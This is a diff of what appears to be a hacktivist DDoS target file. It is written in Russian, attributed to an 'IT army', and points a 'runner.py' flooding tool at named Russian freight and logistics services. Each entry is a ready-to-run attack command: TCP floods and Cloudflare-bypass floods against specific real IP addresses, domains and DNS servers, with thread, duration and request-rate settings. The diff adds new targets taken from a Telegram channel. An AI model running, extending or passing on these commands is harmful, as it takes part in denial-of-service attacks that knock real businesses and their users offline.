@@ -11,10 +11,14 @@
 #runner.py tcp://87.226.162.181:80 tcp://87.226.162.181:443 tcp://87.226.162.53:80 tcp://87.226.162.53:443 tcp://95.167.23.6:80 tcp://95.167.23.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
-runner.py https://www.vezetvsem.ru/ -t 500 -p 1800 --rpc 100 --http-methods CFB --debug
+#runner.py https://www.vezetvsem.ru/ -t 500 -p 1800 --rpc 100 --http-methods CFB --debug
 
 ### На связи Украинский Жнец, нашли DNS-хосты ati.su
 runner.py tcp://139.45.252.51:80 tcp://139.45.252.51:443 tcp://139.45.252.52:443 tcp://139.45.252.22:80 tcp://139.45.252.22:443 tcp://139.45.252.21:80 tcp://193.232.146.1:53 tcp://91.217.21.1:53 tcp://91.217.20.1:53 -t 500 -p 1800 --rpc 100 --http-methods TCP FLOOD  --debug
 
 ### У кого есть возможность запустить ещё атаку, на 7 уровне можно лупить https://groozgo.ru/ сквозь Cloudflare:
 runner.py https://groozgo.ru/ -t 500 -p 1800 --rpc 100 --http-methods CFB --debug
+
+### обновляем цели вчерашнего дня есть возможность помочь ИТ армии. https://t.me/c/1624648668/111
+runner.py tcp://194.85.18.32:80 tcp://194.85.18.32:443 tcp://194.85.18.31:80 tcp://194.85.18.31:443 -t 1000 -p 300 --rpc 100 --http-methods TCP FLOOD --debug 
+
